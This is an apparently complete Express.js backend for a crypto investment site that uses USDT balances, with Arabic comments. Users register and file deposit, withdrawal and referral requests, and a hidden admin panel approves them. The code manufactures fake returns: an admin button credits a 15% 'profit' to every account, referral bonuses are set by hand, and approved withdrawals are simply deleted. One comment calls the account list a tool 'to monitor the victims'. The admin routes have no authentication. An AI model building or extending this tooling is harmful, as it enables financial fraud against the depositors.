const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// مخازن البيانات المؤقتة لربط واجهة المستخدم بلوحة المشرف حياً طوال الوقت
let users = {}; 
let pendingRequests = []; 

// تفعيل حزم قراءة ومعالجة البيانات القادمة من الواجهات
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// تشغيل وقراءة المجلد الرئيسي للمشروع لقراءة ملفات HTML
app.use(express.static(path.join(__dirname)));

// -------------------------------------------------------------
// 📡 الـ APIs الخاصة بربط وتبادل البيانات حياً ومباشرة
// -------------------------------------------------------------

// 1. تسجيل مستخدم جديد أو جلب بيانات أرصاد حساباته الحالية تلقائياً
app.post('/api/register-user', (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: "الاسم مطلوب" });

    // إذا لم يكن المستخدم موجوداً في الذاكرة، يتم إنشاؤه بحساب مصفر تماماً كما في التصميم
    if (!users[username]) {
        users[username] = {
            username: username,
            totalBalance: "USDT 0.00",
            dailyProfit: "USDT 0.00",
            bonus: "USDT 0.00",
            activeTeam: 0
        };
    }
    res.status(200).json({ success: true, user: users[username] });
});

// 2. استقبال العمليات الحية (طلبات سحب حمراء، شحن رصيد أخضر، إحالة بنفسجية) من المستخدم
app.post('/api/submit-request', (req, res) => {
    const { username, type, amount, wallet, details } = req.body;
    
    const newRequest = {
        id: Date.now(),
        username: username || "مستخدم غير مسجل",
        type: type, // يحمل نوع السحب أو الشحن أو الإحالة
        amount: amount || "0",
        wallet: wallet || "---",
        details: details || "",
        status: "Bekliyor" // الحالة الافتراضية للطلب (معلق)
    };

    pendingRequests.push(newRequest);
    console.log(`📡 [بث حي للمشرف] طلب جديد: [${type}] من [${username}] بمبلغ ${amount}`);
    res.status(200).json({ success: true });
});

// 3. API جلب كافة طلبات السحب والشحن المعلقة لصبها حياً داخل جدول المشرف الأول
app.get('/api/admin/requests', (req, res) => {
    res.status(200).json(pendingRequests);
});

// 4. API جلب قائمة الحسابات والأرصدة لبثها حياً داخل جدول المشرف الثاني لمراقبة الضحايا
app.get('/api/admin/users', (req, res) => {
    res.status(200).json(Object.values(users));
});

// 5. إجراء المشرف المباشر (عند ضغط أزرار موافقة أو رفض لتحديث الأرصدة تلقائياً)
app.post('/api/admin/action', (req, res) => {
    const { requestId, action } = req.body;
    
    // البحث عن الطلب المستهدف في القائمة
    const targetRequest = pendingRequests.find(r => r.id === requestId);
    
    if (targetRequest && action === 'onayla') {
        const user = users[targetRequest.username];
        if (user) {
            const numAmount = parseFloat(targetRequest.amount) || 0;
            
            // إذا وافق المشرف على طلب الشحن الأخضر، يتم زيادة إجمالي رأس المال برمجياً فوراً
            if (targetRequest.type.includes("شحن") || targetRequest.type.includes("Kontör")) {
                const currentCapital = parseFloat(user.totalBalance.replace("USDT ", "")) || 0;
                user.totalBalance = `USDT ${(currentCapital + numAmount).toFixed(2)}`;
            } 
            // إذا وافق المشرف على طلب مكافأة الإحالة البنفسجية، يتم تفعيل المكافأة ورفع عداد الفريق
            else if (targetRequest.type.includes("إحالة") || targetRequest.type.includes("Referans")) {
                user.bonus = `USDT 50.00`; 
                user.activeTeam = Math.min(user.activeTeam + 1, 40); // زيادة الفريق تدريجياً حتى 40
            }
        }
    }

    // إزالة الطلب من قائمة المعلقات بعد اتخاذ القرار وضغط الزر لتنظيف الشاشة
    pendingRequests = pendingRequests.filter(r => r.id !== requestId);
    res.status(200).json({ success: true });
});

// 6. زر الإجراءات الجماعية: توزيع الأرباح تلقائياً بنسبة 15% لجميع المسجلين بلمسة واحدة
app.post('/api/admin/distribute-profits', (req, res) => {
    Object.keys(users).forEach(username => {
        const user = users[username];
        const capital = parseFloat(user.totalBalance.replace("USDT ", "")) || 0;
        
        if (capital > 0) {
            const calculatedProfit = capital * 0.15; // احتساب نسبة الـ 15% من رأس المال الحالي
            const currentDaily = parseFloat(user.dailyProfit.replace("USDT ", "")) || 0;
            user.dailyProfit = `USDT ${(currentDaily + calculatedProfit).toFixed(2)}`;
        }
    });
    res.status(200).json({ success: true });
});

// -------------------------------------------------------------
// 📁 توجيه مسارات الصفحات (Routing) - تم الترتيب برمجياً لمنع الشلل
// -------------------------------------------------------------

// مسار فتح صفحة المشرف السرية بالترتيب الصحيح قبل المسار العام
app.get('/admin-panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// المسار العام والافتراضي لفتح واجهة المستخدم (دائماً يوضع بأسفل الملف)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// تشغيل الخادم السحابي
app.listen(PORT, () => {
    console.log(`🚀 المنظومة متصلة بالكامل وتعمل بنجاح على النطاق الفعلي والمستقر عبر المنفذ: ${PORT}`);
});
